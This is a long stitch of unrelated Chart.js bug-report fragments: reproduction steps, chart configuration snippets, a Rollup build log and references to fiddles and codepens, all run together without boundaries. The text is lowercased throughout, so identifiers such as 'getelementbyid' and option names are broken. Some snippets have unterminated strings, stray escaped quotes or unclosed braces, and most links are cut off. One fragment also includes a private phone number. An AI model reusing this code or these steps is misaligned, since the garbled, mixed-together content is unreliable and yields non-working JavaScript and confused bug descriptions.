this bug is unique in that it is appearing on one machine (which was working before) with same code that is working on other machines fine, and in other browsers fine, just chrome/brave is affected
i'd like to see if others have found this behavior and/or keep this issue open so people can comment their findings on the same bug
it definitely exists, and would like to get more people to chime in when it happens to try and track it down.
bug can be reproduced with this codepen: here are the steps in detail:
create time based chart with one dataset and two yaxes (named 'y1' and 'unused'), one not displayed and unused, the other assigned to the dataset via yaxisid
add a second dataset without axisid
call chart update().
remove 'y1' axis
push new axis configuration for two similar axes 'y1' (again) and 'y2'
assign axes 'y1' to dataset 1 and 'y2' to dataset 2
call chart update().
change "display" property of unused axis to "true"
var xvalues =['1930-1939, '1940-1949','1950-1959','1960-1969', '1970-1979','1980-1989','1990-1999','2000-2009','2010-2019'];
var yvalues =[3,0,0,0,1,153,1041,1313,850];
var title = '1930-2019 (decades)';
var backgroundcolor ='teal';
var bordercolor = 'teal';
$j(window).load(function() { var canvas = document.getelementbyid('canvas'); var ctx = canvas.getcontext('2d'); var barpercentage = ((canvas.width / xvalues.length) / 100); var barchart = new chart(ctx, { type: type, data: { labels: xvalues, datasets: [{ label: '', data: yvalues, backgroundcolor: backgroundcolor, bordercolor: bordercolor, borderwidth: 1 }] }, options: { scales: { yaxes: [{ ticks: { beginatzero: true, display: true }, gridlines: { display: true } }], xaxes: [{ // change here barpercentage: barpercentage, ticks: { display: true //this will remove only the label }, gridlines: { display: true } }] }, legend : { display: false }, title: { display: true, text: title }, hover: { onhover: function(e) { var point = this.getelementatevent(e); if (point.length) e.target.style.cursor = 'pointer'; else e.target.style.cursor = 'default'; } } } });
##with the sample code
tried sample provided :
please contact me on +919923456158
* create a chart
* clear the chart and destroy it
* clear the chart
click the button, the graph title will correctly update but the aspect ratio does not.
the problematic example is right on the documentation page as mentioned in the current behavior section.
### codes
import * as react from 'react'
import { radar } from 'react-chartjs-2' interface props { dataarray?: number[],
interface state { } const dataliteracy: chart.chartdata = { labels: [' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '], datasets: [{ // label: 'literacy', backgroundcolor: 'rgba(228,164,89,0.2)', bordercolor: 'rgba(228,164,89,0.8)', borderwidth: 1.5, pointbackgroundcolor: 'rgba(228,164,89,0.5)', pointbordercolor: 'rgba(228,164,89,1)', pointborderwidth: 3, pointhoverbackgroundcolor: 'rgba(228,164,89,0.5)', pointhoverbordercolor: 'rgba(228,164,89,1)', data: [2, 3, 4, 1, 2, 3, 4, 5], }],
} const options: chart.radialchartoptions = { maintainaspectratio: false, aspectratio: 1.5, layout: { padding: 0 }, scale: { pointlabels: { fontsize: 0, fontcolor: 'rgba(139,141,158,1)', }, ticks: { min: 0, max: 5, stepsize: 1, display: false, }, gridlines: { color: 'rgba(255,255,255,0.9)', linewidth: 1.5, }, anglelines: { color: 'rgba(255,255,255,0.9)', linewidth: 1.5, }, }, legend: { display: false, }, tooltips: { backgroundcolor: 'rgba(204, 204, 204, 0.9)', titlefontcolor: 'rgba(59, 59, 59, 1)', bodyfontcolor: 'rgba(59, 59, 59, 1)', ypadding: 10, xpadding: 10, },
} export default class radarchart2 extends react.component<props, state> { public dataset = dataliteracy public chartreference = {} constructor(props) { super(props) if (props.dataarray) { this.dataset.datasets[0].data = props.dataarray } } public render() { return ( <div classname='radarchartdemo2'> <radar data={this.dataset} options={options} /> </div> ) }
``` ```scss
body { -webkit-font-feature-settings: 'palt'; font-feature-settings: 'palt';
} .radarchartdemo2 { margin: 100px; width: 200px; height: 200px; padding: 0; box-sizing: content-box; canvas { background-image: url('../../assets/images/charts/radar_base.svg'); background-size: 100%; background-repeat: no-repeat; }
``` it backs normal if `font-feature-settings: 'palt';` disabled.
see simple code example at
(for bugs) 1
see fiddle:
right click in the bottom right window and inspect to display your developer console in order to see the javascript error when running the fiddle.
uncomment either the `animation options` or the `mychart.update()` line to make the error go away.
use brave browser to view chartjs charts
open
in js tab, switch data between **datathatworks** and **datathatdoesnotwork**
in css tab, switch width between **900px** and **1200px**
please see official samples
in this page v2.8.0 is being used
this bug can be seen
![v2 8 0]( in this page v2.5.0 is being used, so this bug doesn't occur.
![v2 5 0](
please create a bar chart with all negative data.
(for bugs) interactive live demo: note line 27 in `src/index.js` where `borderradius.bottom` is specified, but this has no effect on the displayed bar chart.
setup a chart.js environment
i've tested this out with chart.js 2.8.0 as part of an angular 6 application.
add a canvas element having the following configuration:
<canvas [options]="options" [colors]="colors" [legend]="true" [type]="line" [datasets]="datathatworks"> please play around with the data provided on **step 3** </canvas>
// in js / ts file:
public options: any = { responsive: true, maintainaspectratio: true, aspectratio: 3.7, scales: { xaxes: [{ type: 'time', time: { format: this.timeformat, tooltipformat: 'll' }, scalelabel: { display: true, labelstring: 'date' }, ticks: { source: 'auto' }, bounds: 'data' }], yaxes: [{ scalelabel: { display: true, labelstring: '' }, ticks: { beginatzero: true }, bounds: 'data' }] }, legend: { position: 'bottom' } }; linechartcolors = // irrelevant at the moment ``` 3
switch between the two data sets that are provided
they both try to represent values on an y-axis with dates on the x-axis
one of them generates the ticks correctly while the other generates ticks in the magnitude of hours
datathatdoesnotwork = [{
label: 'mock'
{x: 1552868040000, y: 190000},
{x: 1553040840000, y: 195000},
{x: 1553213640000, y: 200000},
{x: 1553472840000, y: 205000}
]; datathatworks= [{
label: 'mock'
{x: 1550880840000, y: 190000},
{x: 1551053640000, y: 195000},
{x: 1553300040000, y: 200000},
{x: 1553472840000, y: 205000}
i was not able to have a simple reproduction step.
investigation in progress.
just try to draw anything.
create a line chart with a x axis of type "time" and no data.
resize the browser so the chart gets smaller/bigger
here is a sample of the problem:
this reproduction can be difficult since it's only happening on some screen sizes
i'm plotting values at the max
the screen width of the above screenshot was at 467px.
data point with value 2 is not visible when options.title: { display: true }, data point with value 2 is visible when options.title: { display: false },
(for bugs)**
if i change x value to 10, it is working fine
but if i increase the number to 100 or more we can black screen in the below example.
we are expecting to use x=1000 in our app **
[live example](
i sat up this quick example, open up the console and change the width in both `rtl`, and `ltr` modes and observe.
create a chart and ```javascript
charttemplate.options.onclick = function () { console.log('click on chart');
}; charttemplate.options.legend.onclick = function () { console.log('chart click on legend?');
with chart.js 2.7.3
note that the red line is absent from the mar 18 bar
var ctx = document.getelementbyid("chart").getcontext(\'2d\');
var chart = new chart(ctx, { type: 'bar', data: { labels: ['feb 18', 'mar 18'], datasets: [{ backgroundcolor: '#aaffcc', bordercolor: '#0000ff', borderwidth: 1, data: [1, -1] }] }, options: { scales: { yaxes: [{ gridlines: { zerolinecolor: '#ff0000' }, }] }, maintainaspectratio: false }
``` setting maintainaspectratio: true changes the border behaviour, but doesn't fix the issue.
an 'live demo' is not useful here
instead, i can provide detailed steps to reproduce, and a link tot he commit in the source tree of my open-source project: (note that there ~~may be~~ probably are additional commits after this, so if you `git clone` you'll want to `git checkout` the exact commit)
- i'm using [rollup]( as my js build system, with the es6 module syntax
- i\'m installing packages from npm - including `chart.js` i\'ve got an `index.mjs` like this: "use strict";
import \'../css/main.css\'; import myprojectclass from \'./myprojectclass.mjs\'; window.addeventlistener("load", function(_event) { window.project = new myprojectclass(); window.map.setup();
``` ...the chart.js `import` is buried in the application
it looks like this (in one of the sub-files): ```js
import chart from 'chart.js';
``` i get the following output from `rollup` on the command-line: ```
client_src/js/index.mjs app/app.js...
(!) postcss plugin: the onwrite hook used by plugin postcss is deprecated
the generatebundle hook should be used instead.
(!) circular dependency: node_modules/moment/src/lib/create/from-anything.js -> node_modules/moment/src/lib/create/valid.js -> node_modules/moment/src/lib/create/utc.js -> node_modules/moment/src/lib/create/from-anything.js
(!) circular dependency: node_modules/moment/src/lib/units/month.js -> node_modules/moment/src/lib/moment/get-set.js -> node_modules/moment/src/lib/units/month.js
(!) circular dependency: node_modules/moment/src/lib/moment/get-set.js -> node_modules/moment/src/lib/units/year.js -> node_modules/moment/src/lib/moment/get-set.js
(!) circular dependency: node_modules/moment/src/lib/create/local.js -> node_modules/moment/src/lib/create/from-anything.js -> node_modules/moment/src/lib/locale/locales.js -> node_modules/moment/src/lib/locale/base-config.js -> node_modules/moment/src/lib/units/week.js -> node_modules/moment/src/lib/create/local.js
(!) circular dependency: node_modules/moment/src/lib/create/local.js -> node_modules/moment/src/lib/create/from-anything.js -> node_modules/moment/src/lib/locale/locales.js -> node_modules/moment/src/lib/locale/base-config.js -> node_modules/moment/src/lib/units/week.js -> node_modules/moment/src/lib/units/week-calendar-utils.js -> node_modules/moment/src/lib/create/local.js
(!) circular dependency: node_modules/moment/src/lib/create/from-string-and-format.js -> node_modules/moment/src/lib/create/from-string.js -> node_modules/moment/src/lib/create/from-string-and-format.js
(!) circular dependency: node_modules/moment/src/lib/create/local.js -> node_modules/moment/src/lib/create/from-anything.js -> node_modules/moment/src/lib/create/from-string-and-array.js -> node_modules/moment/src/lib/create/from-string-and-format.js -> node_modules/moment/src/lib/create/from-string.js -> node_modules/moment/src/lib/create/from-array.js -> node_modules/moment/src/lib/create/local.js
(!) circular dependency: node_modules/moment/src/lib/duration/constructor.js -> node_modules/moment/src/lib/duration/valid.js -> node_modules/moment/src/lib/duration/constructor.js
(!) circular dependency: node_modules/moment/src/lib/duration/create.js -> node_modules/moment/src/lib/duration/constructor.js -> node_modules/moment/src/lib/duration/valid.js -> node_modules/moment/src/lib/duration/create.js
(!) circular dependency: node_modules/moment/src/lib/duration/create.js -> node_modules/moment/src/lib/units/offset.js -> node_modules/moment/src/lib/duration/create.js
(!) circular dependency: node_modules/moment/src/lib/moment/add-subtract.js -> node_modules/moment/src/lib/duration/create.js -> node_modules/moment/src/lib/units/offset.js -> node_modules/moment/src/lib/moment/add-subtract.js
created app/app.js in 2.5s
``` the error in the _firefox developer tools_ comes with a stack trace
here it is: ```
typeerror: node.addeventlistener is not a function[learn more] platform.dom.js:127:1 addeventlistener platform.dom.js:127 <anonymous> index.mjs:9 ``` .....that `platform.dom.js` is part of chart.js
as i have source maps enabled, it tells me where that file is located: ` `
go to
notice that the y-axis is missing, and that no points are being shown, even though there are two points in the data set.
if you uncomment the one line that adds one point, notice how everything works fine.
<!--- reproduce this bug
include code to reproduce, if relevant -->
create a chart with responsive : true and maintainaspectratio : false
open console
play with the resolution and see the size get bigger and bigger 4.
(for bugs) ### code:
var ctx = document.getelementbyid("mychart").getcontext("2d");
var chart = new chart(ctx, { // the type of chart we want to create type: "bar", // the data for our dataset data: { labels: [ "0k-40k", "40k-80k", "80k-100k", "100k-120k", "120k-160k", "160k-180k", "180k-220k" ], datasets: [ { label: "my first dataset", backgroundcolor: "rgb(255, 99, 132)", bordercolor: "rgb(255, 99, 132)", data: [0, 10, 5, 2, 20, 30, 45] } ] }, // configuration options go here options: { legend: { display: false }, scales: { xaxes: [ { ticks: { autoskip: false, fontsize: 16, fontstyle: "bold", precision: 2, suggestedmin: 0 }, scalelabel: { display: true, fontsize: 16, fontstyle: "bold", labelstring: "chart label x", } } ], yaxes: [ { ticks: { fontsize: 16, fontstyle: "bold", precision: 2, suggestedmin: 0 }, scalelabel: { display: true, fontsize: 16, fontstyle: "bold", labelstring: "chart label y", } } ] } }
i've made [a self-contained repository with steps to reproduce]( repeated here: 1
clone the repo.
open firefox, go to `about:debugging`.
choose "load temporary add-on..." and pick the `manifest.json` file
in a new tab, go to [ where the extension does its magic for completeness, repeating the important bits here, starting with the chart definition: ```javascript
const element = document.body.insertbefore(document.createelement("canvas"), document.body.firstchild);
const chart = new chart(element.getcontext("2d"), { type: "line", data: { datasets: [{ label: "test dataset", data: [ { x: moment(\'20180403\'), y: 3 }, { x: moment(\'20180404\'), y: 8 }, { x: moment(\'20180405\'), y: 6 }, ] }, ], }, options: { scales: { xaxes: [{ type: "time" }] } },
``` and the extension manifest: ```json
{ "manifest_version": 2, "name": "repro chartjs issue", "short_name": "reprochartjsissue", "version": "1.0.0", "author": "jeroen heijmans", "description": "extension solely meant for reproducing an issue with chartjs", "content_scripts": [ { "matches": [" "], "js": ["moment.min.js", "chart.min.js", "app.js"], "run_at": "document_end" } ]
<!--- reproduce this bug
include code to reproduce, if relevant -->
click on the "relabel" button and notice how the bars widen and shrink based on label size.
<!--- reproduce this bug
include code to reproduce, if relevant -->
make grouped chart, first bar has only one value in it while the second has multiple values.
use logarithmic (to shrink down oversized values.)
(for bugs)
<!--- reproduce this bug
include code to reproduce, if relevant -->
set the pattern for the `backgroundcolor` and `hoverbackgroundcolor`
hover over the chart link to codepen:
click on the "toggle x" button and notice how the chart resizes itself to consume the space previously occupied by the x axis
click on the "toggle y" button with the x axis visible and notice how the chart does not resize itself to consume the space previously occupied by the visible y axis
click on the "toggle y" button with the x axis hidden and notice how the chart resizes itself to consume the space previously occupied by the visible y axis
adopt the example from #important-note simply changing viewport units to percentages
<!--- reproduce this bug
include code to reproduce, if relevant -->
(setting it globally has no effect, but setting it on the dataset does)
(for bugs) ```javascript
import \'../../../node_modules/chart.js/dist/chart.js\' class barchartelement extends polymerelement { static get template() { return html` <style include="shared-styles2"> #content{ height: 100%; width: 100%; } </style> <div id="content"></div> `; }
super.ready(); let ican = document.createelement('canvas'); ican.id = 'temp'; this.$.content.appendchild(ican); settimeout(function () { let ctx = (this.$.content.firstelementchild); this.chart = new chart(ctx, { type: 'bar', data: { datasets: [{ backgroundcolor: color, data: data, }], }, options: { responsive: true, maintainaspectratio: true, legend: { display: false, }, tooltips: { enabled: false, }, scales: { xaxes: [{ scalelabel: { display: true, labelstring: 'wochen', fontsize: 16, }, ticks:{ stepsize:1, autoskip: false, }, }], yaxes: [{ scalelabel: { display: true, labelstring: 'auslastung in %', fontsize: 16, }, }] } } }); }.bind(this), 1); }
window.customelements.define('bar-chart', barchartelement);
create any chart and notice it animating
try to prevent the animation
if you figure out how, do tell ;)
<!--- reproduce this bug
include code to reproduce, if relevant -->
have at least one data source
change the data or reload it by interval or polling
click toggle the legend
wait for new data and see the legend and line show again
add `mode: 'x'` to hover settings to a chart and it all turns bad
create some dataset which include few points on left then few points on right but with the 5-6 days difference in time.
<!--- reproduce this bug
include code to reproduce, if relevant -->
[
open in edge -> chart is not displayed
open in any other browser -> chart is displayed
<!--- reproduce this bug
include code to reproduce, if relevant -->
here the problem on [stackoverflow]( #comment90293750_51654009)
here the [jsfiddle ](
<!--- reproduce this bug
include code to reproduce, if relevant -->
set responsive to false and maintainaspectratio to true.
set the canvas width to 60px and height to 20px (although the distortion starts happening from 50px to 40px).
hide the axes, legend, tooltips, etc
jsfiddle:
this is my fiddle -
<!--- reproduce this bug
include code to reproduce, if relevant -->
see mode _dataset_ examples at
<!--- reproduce this bug
include code to reproduce, if relevant -->
[code pen](
open codepen
resize preview window horizontally and notice that the final item at overlaps the chart
generate an angular project with angular-cli
add chart.js as a dependency
generate a component with encapsulation set to viewencapsulation.native
add a canvas in the component
create a chart with chart.js using the canvas 2d context
when the width of container is set to a certain width, e.g
352px, the line disappears.
<!--- reproduce this bug
include code to reproduce, if relevant -->
please see an example on the codepen.
(for bugs) setup a graph with a time scale and values "00:34:12" for example, with hh > 24
open this fiddle
resize the result section until the bar is gone.
plot with chart js 2.1.0: [plot in js fiddle](
the plot works correctly.
plot with chart js 2.7.2: [plot in js fiddle, chart js 2.7.2]( the cdn was changed on the side of the js fiddle website, in the resources section
the cdn link for the `chart.bundle.min.js` is different between the two examples above
all other code is exactly the same.
start safari v11.0
open chart js "get started" web site.
select charts > doughnut & pie ([
scroll to see chart example.
(for bugs) 1
the april 25 and may 6 bars are cut off in the middle.
<!--- reproduce this bug
include code to reproduce, if relevant -->
render a bar chart with blue font color.
upon js trigger event, update the tick font color with chart.options.scales.yaxes[0].ticks.fontcolor = '#ffffff' 3
call chart.update();
nothing happened.
chart.data.datasets[0].backgroundcolor works though.
put two canvases in to `col`s:
<div class="row"> <div class="col"><canvas id="language-chart"></canvas></div> <div class="col"><canvas id="subject-chart"></canvas></div>
initialize 2 line charts like the docs tells you to
load the page in a maximized browser, everything's normal
change the width of the browser to about the tablet width
go back to maximized
make sample chart with any data and use the following scale option: `scales: { yaxes: [{ ticks: { min: 0, max: 10, stepsize: 2.5, display: true, beginatzero: true } }] }`
i've created a jsfiddle with the basic example from the docs
<!--- reproduce this bug
include code to reproduce, if relevant -->
navigate to another browser tab
navigate back to the jsfiddle tab
chart wont appear until you interact with it.
(for bugs) 1
describe a point with background and border: ```javascript { label: 'my points', backgroundcolor: '#33a9e0', bordercolor: '#33a9e0', borderwidth: 1, data: [], fill: false, linetension: 0.2, pointbackgroundcolor: '#ffffff', pointbordercolor: '#33a9e0', pointhoverradius: 9, pointradius: 8, showline: false, spangaps: true } ```
activate the `usepointstyle` option: ```javascript legend: { labels: { boxwidth: 15, usepointstyle: true } } ```
i created a bar chart with two datasets
this chart is created on a div with a horizontal scroll bar
![chart-graphical-shift-error](
create a chart?
(for bugs)
(for bugs) [jsfiddle](
comment out line 68` type: 'time'` ## screenshot:
![image](
1) make some data with like: [{x: 'a', y:10}, ...] 2) delete some from middle.
#
- on the rendered chart, toggle "series 2", the issue is plainly visible
- in the data, put "series 2" at the end (or the start) of the array
the issue disappears.
<!--- reproduce this bug
include code to reproduce, if relevant --> i'm not sure if i'm missing a setting or something (though i don't see why centering wouldn't be default behaviour)...
add chart.js to a page
open the page with the `content-security-policy: style-src 'self'` directive set
<!--- reproduce this bug
include code to reproduce, if relevant -->
<!--- reproduce this bug
include code to reproduce, if relevant -->
within a browser supporting modules, create a `<script type="module">`
inside that, import chart.
the error will occur.
<head> <title>test</title>
<body> <script type="module"> import chart from \' console.log(chart) </script>
codepen demo:
<!--- reproduce this bug
include code to reproduce, if relevant -->
build logarithmic chart with few labels: any value and zero value.
bar with the highest value will be small, regardless of auto scale and any labels and ticks options
options = { scales: { yaxes: [{ type: 'logarithmic', gridlines: {display: true, linewidth: 1}, ticks: { beginatzero: true, callback: function(value, index, values) {return value;} } }] } };
changing non-zero value wont affect chart's logarithmic scale.
[example with issue](
i created a codepen to reproduce my problem.
create line chart with time on either axis
set min & max for that axis ## demo
<!--- reproduce this bug
include code to reproduce, if relevant -->
open with chrome
reload it with ctrl + f5 (or cmd + f5 for mac)
open the **stacked.html** or **stacked-group.html** file
move the mouse pointer between bars and groups
i was unable to reproduce it in a development environment, it only happends sporadically in production after hours of usage.
click the link
axis label changes, axis type does not
please consider followed example(title dislayed):
max values are cut whereas when the title is not displayed everything works fine (see example):
here's a fiddle:
create radar chart
use 'hind' font from google fonts
<!--- reproduce this bug
include code to reproduce, if relevant -->
jsfiddle:
create a custom tick format that returns null on at least one tick
set autoskip=false on same axis
a link to the gh-pages live example would be useless because that code is going to change, but here's a pastebin of the current code:
<!--- reproduce this bug
include code to reproduce, if relevant -->
have a chart in a iframe and force a redraw then click on another link short after
<!--- reproduce this bug
include code to reproduce, if relevant -->
dataset with 2 and more values dataset with 1 value
<!--- reproduce this bug
include code to reproduce, if relevant -->
set up a chart with multiple datasets and large amount of data to be displayed
set the canvas size to something small similar size like the attached picture.
<!--- reproduce this bug
include code to reproduce, if relevant -->
comment lines from 20 to 24
<!--- reproduce this bug
include code to reproduce, if relevant -->
see the [sample code](
pan to the right (">") several times until all data has gone to the left (in the scatterchart)
see the different behaviour of the time scale.
pan to the left and see the same happens in the opposite direction.
click the buttons and see that this also happens when showing a range within the data: see that the second and the one before the last data points are shown, despite focusing only in the two central points.
see
i leave this fiddle to show the issue.
see example here
<!--- reproduce this bug
include code to reproduce, if relevant -->
observe there is no chart.
add a single, empty element to options.labels.
observer there is now a chart.
link below in environment section.
see
see
[fiddle]( 1
press "toggle display"
you should see that the chart is squished (very low height).
remove the `style="display: none;` and re-run the fiddle.
you should see that the chart is the correct size
i expect both to have the same size.
for example on sample page press btn `randomize data` many times
* chart.js version: any version
* browser name and version: any browser
navigate to in internet explorer 11
observe no data lines are rendered
here is my example:[
(for bugs) [ 1
just hide 'a'
<!--- reproduce this bug
include code to reproduce, if relevant -->
[
<!--- reproduce this bug
include code to reproduce, if relevant -->
graph a data set using a time scale on the x-axis.
set the x-axis min or max to be inside the data's x range.
see the pen linked above.
just use the following option to a chart: ```code:javascript
options.scales.xaxes: [{type: 'time'}]
``` demo [**here**]( stackoverflow [question](
go to and change the stacked from false to true and hit run and the page will crash.
see:
[jsfiddle](
this script has no problem:
this causes the error above:
[working v2.5 fiddle](
[not working v2.6 fiddle](
<!--- reproduce this bug
include code to reproduce, if relevant --> bug would be hard to reproduce in a fiddle or something because it involves reactjs
if someone can point me in the right direction for reproducing this bug in straight-forward way i would be glad to do that.
<!--- reproduce this bug
include code to reproduce, if relevant --> **issue#a**
go to
move mouse between bars (try both slowly and faster)
you will see tooltip is jumping **issue#b**
go to (on your mobile)
touch or move on/to some bar
you will see tooltip does not disappeared when touch end.
chart.js version 2.5.0
chart.js version 2.6.0
example is with chart.js version 2.6.0
switch to 2.5.0 to see this working
it is all the same but the chart.js version.
its difficult to reproduce but, open this in your browser ( keep it open for a while and you will see pie charts starting to get distorted, also note that changing the browser window size will make the problem go away
i think the problem is more likely to occur when the browser window isn't fully expanded
as far as i know it occurs in google chrome and safari, i haven't tried any other browsers
**here is my code:**
<div class="container-fluid"> <div id="mycarousel" class="carousel slide"> <div class="navbar navbar-default visible-xs bg-5" role="navigation"> <div class="navbar-header"> <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#nav-pillz"> <span class="sr-only">toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span> </button> </div> </div> <div class="collapse navbar-collapse" id="nav-pillz"> <ul class="nav nav-pills nav-justified"> <li data-target="#mycarousel" data-slide-to="0" class="active"><a href="#">page a</a></li> <li data-target="#mycarousel" data-slide-to="1"><a href="#">page b</a></li> <li data-target="#mycarousel" data-slide-to="2"><a href="#">page c</a></li> <li data-target="#mycarousel" data-slide-to="3"><a href="#">page d</a></li> <li data-target="#mycarousel" data-slide-to="4"><a href="#">page e</a></li> </ul> </div>
``` **the first item of the carousel with two pie charts inside(the other items are the same):**
<div class="carousel-inner">
<div class="item active"> <div class="row bg-6"> <div class="col-sm-1 col-md-1 col-lg-1"></div> <div class="col-sm-4 col-md-4 col-lg-4"> <br> <canvas id="piecharta" ></canvas> <br> </div> <div class="col-sm-2 col-md-2 col-lg-2"></div> <div class="col-sm-4 col-md-4 col-lg-4"> <br> <canvas id="piechartb" ></canvas> <br> </div> <div class="col-sm-1 col-md-1 col-lg-1"></div> </div>
``` **chart js javascript file:** ```
$(document).ready( function() { var ctx = document.getelementbyid("piecharta");
var mypiechart = new chart(ctx,{ type: \'pie\', data: { labels: ["red","blue","yellow"], datasets: [{ data: [30, 15, 55], backgroundcolor: [ "#ff6384", "#36a2eb", "#ffce56" ], hoverbackgroundcolor: [ "#ff6384", "#36a2eb", "#ffce56" ] }]}, options: { animation : false } }); }); $(document).ready( function() {
var ctx = document.getelementbyid("piechartb");
var mypiechart = new chart(ctx,{ type: \'pie\', data: { labels: ["red","blue","yellow"], datasets: [{ data: [30, 15, 55], backgroundcolor: [ "#ff6384", "#36a2eb", "#ffce56" ], hoverbackgroundcolor: [ "#ff6384", "#36a2eb", "#ffce56" ] }]}, options: { animation : false } }); });
``` **javascript file which controls carousel:**
$(document).ready( function() { $('#mycarousel').carousel({ interval: 4000 }); $('#playbutton').click(function () { $('#mycarousel').carousel('cycle'); }); $('#pausebutton').click(function () { $('#mycarousel').carousel('pause'); }); var clickevent = false; $('#mycarousel').on('click', '.nav a', function() { clickevent = true; $('.nav li').removeclass('active'); $(this).parent().addclass('active'); }).on('slid.bs.carousel', function(e) { if(!clickevent) { var count = $('.nav').children().length -1; var current = $('.nav li.active'); current.removeclass('active').next().addclass('active'); var id = parseint(current.data('slide-to')); if(count == id) { $('.nav li').first().addclass('active'); } } clickevent = false; });
```html <script src=" "></script>
<script src=" "></script> <canvas id="chart" width="600px" height="400px"></canvas> <script type="text/javascript"> var chart = new chart( $("#chart")[0].getcontext(\'2d\'), { type: "line", data: { labels: [0,1], datasets: [{ data: [] }] }, options: { responsive: false, maintainaspectratio: true, scales: { xaxes: [{ type: "time", ticks: { autoskip: true, maxtickslimit: 10, }, time: { min: new date(), // moment(), // both have same effect } }] } } }); chart.data.datasets[0].data.push({ x: new date(), y: 1, }); chart.update(); </script>
one series is hidden:
works as expected:
<!--- reproduce this bug
include code to reproduce, if relevant --> [fiddle]( note that i already tried a string with the same character length, but it didn't cause the same issue.
go to
click 'scatter' or 'scatter multi-axis' - -
[link to a codepen with the bug](
the behavior when the mouse moves during data animation is a bit different to the bug that i found, but the main problem stays, that is that the tooltip doesn't move during chart animation.
<!--- reproduce this bug
include code to reproduce, if relevant -->
create a chart and check the console.
i use this script var ctx = document.getelementbyid("mychart").getcontext("2d"); var mychart = new chart(ctx, { type: \'line\', data: { labels: [ <?php ..
?> ], datasets: [{ label: '<?php ..
?>', data: [ <?php..
?> ], backgroundcolor: "rgba(0,153,255,0.4)", bordercolor: "rgb(0,153,255)", fill: false, pointradius: 0, yaxisid : "axis1" } , { label: \'<?php ..
?>', data: [ <?php..
?> ], backgroundcolor: "rgba(255,153,0,0.4)", bordercolor: "rgb(255,153,0)", fill: false, pointradius: 0, yaxisid : "axis2" }] }, options: { maintainaspectratio: false, title: {display: false}, scales: { yaxes: [{ id: "axis1", ticks: { max: <?php ..
?>, min: <?php ..
?>, fontcolor: \'#09f\' } } , { id: "axis2", ticks: { max: <?php ..
?>, min: <?php ..
?>, fontcolor: '#f90' } }], xaxes: [{ type: 'time', time: { displayformats: { quarter: 'hh:mm' }, unit: '<?php ..
?>', unitstepsize: <?php ..
?> } }] } }
here a fiddle example:
(for bugs) <img width="574" alt="wx20170531-122302 2x" src=" ">
the first and last bar are not displaying in full.
also this problem has been posted here:
example gist:
<!--- reproduce this bug
include code to reproduce, if relevant -->
go to live example:
i have set a new default color of '#ff0000' or red in the javascript code, but there is no change on the chart.
when hovering over on a segment, the tooltip shows but the onhover function is not called.
when clicking a segment, the onclick function is called.
codepen:
go to the unedited codepen:
open chrome dev tools console and set log level to verbose
refresh page
see verbose log in console: ```[violation] added non-passive event listener to a scroll-blocking 'touchstart' event
consider marking event handler as 'passive' to make the page more responsive.
chart.bundle.min.js:14```
<!--- reproduce this bug
include code to reproduce, if relevant -->
set the background color for a dataset to a pattern.
try to hover over a point to show the tooltip example:
create a chart with numerical and time scale data
configure it to show the numerical data on the y axis and the time on the x axis 3
set min and max with the min and max values from the array of time values
create a project with uikit 3
create a grid
insert a graph
example of the issue (chart.js 2.5) can be found in both top and bottom width are thinner than expected
previous version (chart.js 2.4) is working fine
here is the code of options object that i used:
`options:{ scales: { xaxes: [{ type: 'time', time: {parser: 'dd.mm.yyyy', unit: 'month'}, ticks: {beginatzero: true} }], yaxes: [{ ticks: {beginatzero: true, callback:function(d){console.log(d)}} }] } };`
<!--- reproduce this bug
include code to reproduce, if relevant -->
have a time axis on the x axis
have a category axis on the y axis
<!--- reproduce this bug
include code to reproduce, if relevant -->
use version 2.4.0 or later of the chart.js library
create a chart that results in multiple points having close adjacency
configure the dataset points to be transparent until hovered over and to have high `pointhitradius`:
{ pointradius: 5, pointhoverradius: 5, pointhitradius: 12, pointbordercolor: 'transparent', pointbackgroundcolor: 'transparent', pointhoverbackgroundcolor: 'purple',
hover near the close points to notice that the tooltip will point to a point that is **not** set in a hover state
also note that the point background in the tooltip remains transparent.
see this jsfiddle -> resize the output window to see the legend item issue.
removing the padding options will resize the legend correctly.
see this jsfiddle -> remove the right padding property to see a large change between chart and legend.
remove the left padding to see a small change between the chart and legend.
link to jsfiddle
<!--- reproduce this bug
include code to reproduce, if relevant -->
try this fiddle in firefox 51 and follow the instructions in comments :
<!--- reproduce this bug
include code to reproduce, if relevant -->
[my jsbin](
`2.5.0` -- bug
`2.4.0` -- working
<!--- reproduce this bug
include code to reproduce, if relevant -->
[
dataset.type = 'bar'
dataset.data = set some data
yaxis.stacked = true
yaxis.ticks.min = minimum
var ctx = $('#chart-errors');
var bubblechartdata = { ylabels: [400, 404, 503], datasets: [{ label: \'errors\', backgroundcolor: \'red\', bordercolor: \'red\', borderwidth: 1, data: [{ "x": "2017-03-06t15:00:00.000z", "y": 400, "quantity": 1, "r": 5 }, { "x": "2017-03-14t03:00:00.000z", "y": 503, "quantity": 1, "r": 5 }, { "x": "2017-03-20t15:00:00.000z", "y": 400, "quantity": 4, "r": 5 }, { "x": "2017-03-20t15:00:00.000z", "y": 404, "quantity": 1, "r": 5 }] }]
var chart = new chart(ctx, { type: 'bubble', data: bubblechartdata, options: { scales: { yaxes: [{ type: 'category', position: 'left' }], xaxes: [{ type: 'time', }] } }
<!--- reproduce this bug
include code to reproduce, if relevant -->
make a kibana plugin
load a chart.js in kibana (ex
private(require('plugins/circle-vis/chartjs/chart')) )
started kibana (ex
systemctl start kibana)
![image](
![image]( 2 is how it looks on chrome and 3 it is how it looks on mozilla
as you can see some letters overlap each other
<!--- reproduce this bug
include code to reproduce, if relevant -->
[demo of desired functionality not working w/`v.2.5`](
click on "create chart", chart will be successfully created (container is visible)
hide the container by clicking on "toggle container visibility"
click on "create chart" again, browser will freeze (container is hidden)
'bar' type of chart
two datasets, one set to 'bar', the second to 'line'
xaxes scale set to 'time'
open up chart.js>samples>animation>progress-bar.html.
add 'console.log(animation);' on line 71.
open the file in a browser
see undefined in the console log.
<!--- reproduce this bug
include code to reproduce, if relevant -->
see:
hover *above* the bars on the (vertical) bar chart.
note that with `mode: 'index'` and `intersect: false` set, the whole region highlights both sets of data.
![image]( 3
now hover to the right of the horizontal bars *not* on the bar themselves
note that they do not get updated, unlike the vertical bar chart.
![image](
see
<!--- reproduce this bug
include code to reproduce, if relevant -->
**my color object looks like this**
\'graphconfiguration\': { \'colors\': { \'tpgs\': ["#ca9bc1", "#ee7a75", "#99a9bf", "#66a19f", "#ca9bc1", "#ee7a75"] } }
